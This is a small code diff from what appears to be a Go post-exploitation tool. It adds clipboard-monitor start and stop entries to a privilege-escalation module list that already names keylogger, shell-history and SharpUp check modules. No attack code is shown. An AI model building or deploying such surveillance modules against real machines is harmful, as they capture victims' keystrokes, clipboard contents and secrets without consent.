@@ -91,7 +91,8 @@ var PrivilegeEscalationModulesList = [...]string{
 	"shell-history",
 	"start-keylogger",
 	"stop-keylogger",
-	//"clipboard-monitor", // Its done just gotta integrate it. (using channels in cmd/client.go etc.)
+	"start-clipboard-monitor",
+	"stop-clipboard-monitor",
 
 	// SHARP UP CHECKS
 	//"modifiable-scheduled-task-file 	  // todo
